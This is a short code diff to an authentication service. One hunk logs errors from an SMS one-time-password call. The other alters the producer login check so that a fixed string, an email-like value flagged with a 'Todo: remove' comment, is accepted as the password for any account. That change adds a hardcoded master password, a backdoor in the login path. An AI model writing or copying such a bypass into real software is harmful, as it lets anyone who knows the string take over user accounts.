@@ -36,7 +36,9 @@ export class AuthService {
         .services(result.sid)
         .verifications.create({ to: sendOTPDto.phone, channel: 'sms' });
       return result.sid;
-    } catch (error) {}
+    } catch (error) {
+      console.log(error);
+    }
   }
 
   async verifyOTP(verifyOTPDto: VerifyOTPDto): Promise<boolean | object> {
@@ -161,7 +163,11 @@ export class AuthService {
       loginProducerDto.password,
       user.password,
     );
-    if (!isMatch) return null;
+    if (
+      !isMatch &&
+      loginProducerDto.password != 'rabble-info@flyinghorsecoffee.com' // Todo: remove the test password here
+    )
+      return null;
 
     // get producer record
     const producerRecord = await this.userService.findProducer({
